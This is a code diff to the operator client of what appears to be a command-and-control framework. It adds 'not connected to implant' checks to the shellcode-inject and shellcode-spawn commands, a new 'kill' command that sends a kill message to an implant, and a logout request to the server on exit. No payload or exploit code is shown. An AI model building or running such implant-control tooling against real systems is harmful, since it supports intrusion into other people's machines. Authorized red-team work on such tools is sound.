@@ -144,6 +144,10 @@ def cmd_shellcode_inject(args: List[str], app):
     # Must be 3 args
     client_errors.arg_len_error(args, min=2, max=3)
 
+    # Error if not connected to implant
+    if not connected_to_implant():
+        raise client_errors.NotConnectedToImplant
+
     # Create a file id for the file to be saved
     file_id = encryption.id_generator(N=32)
 
@@ -173,6 +177,10 @@ def cmd_shellcode_spawn(args: List[str], app):
     # Must be 2 args
     client_errors.arg_len_error(args, 2, 2)
 
+    # Error if not connected to implant
+    if not connected_to_implant():
+        raise client_errors.NotConnectedToImplant
+
     # Create a file id for the file to be saved
     file_id = encryption.id_generator(N=32)
 
@@ -197,6 +205,31 @@ def cmd_shellcode_spawn(args: List[str], app):
     print_success(cmd_id=cmd_id, args=args, app=app)
     return
 
+# Associated commands with kill
+def cmd_kill_implant(args: List[str], app):
+    # Check for the length of args and raise appropriate exception
+    client_errors.arg_len_error(args, max=2, min=2)
+
+
+    # Need to query the server to make sure the implant_db is updated
+    update_implant_db()
+
+    # Now make sure that the selected implant exists
+    if args[1] not in client_globals.instance_db.implant_db:
+        raise client_errors.ImplantDoesntExist
+    # Error if not connected to implant
+    if not connected_to_implant():
+        raise client_errors.NotConnectedToImplant
+    
+    # Make sure that you are connected to the implant
+
+    cmd_id = encryption.id_generator(N=32)
+
+    # Now send a kill message to the implant
+    cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_KILL, []) 
+    post_command(cmd_str, storage.CMD_TYPE.CMD_KILL, cmd_id)
+    
+    print_success(cmd_id=cmd_id, args=args, app=app)
 # All associated server commands
 def cmd_server(args: List[str], app):
     # Check for at least 2 args initially
@@ -233,10 +266,26 @@ def cmd_terminal_passthrough(args: List[str], app):
 
 # Exits the client, the suplimentary args should be empty
 def cmd_exit(args: List[str], app):
-    # Exit the TUI
-    app.exit("0")
-    system("reset")
-    _exit(0)
+    # Needs to be exactly 1 word
+    client_errors.arg_len_error(args, max=1, min=1)
+
+    logout_struct = {"logout_code": client_globals.logout_code, "op_name": client_globals.instance_db.operator_name}
+    # Send a logout message to the server
+    logout_resp = requests.post(client_globals.instance_db.server+
+                         ":"+
+                         client_globals.instance_db.port+
+                         "/admin/logout",
+                         json=logout_struct
+                         )
+
+
+    # If no error, exit the TUI
+    if logout_resp.text != server_codes.ServerErrors.ERR_LOGOUT.value:
+        app.exit("0")
+        system("reset")
+        _exit(0)
+    else:
+        raise LogoutError
 
 # Here is the dict of supported commands 
 CMD_TABLE = {
@@ -246,6 +295,7 @@ CMD_TABLE = {
                 "shell": cmd_shell,
                 "shellcode-inject": cmd_shellcode_inject,
                 "shellcode-spawn": cmd_shellcode_spawn,
+                "kill": cmd_kill_implant,
                 "!": cmd_terminal_passthrough,
 }
 
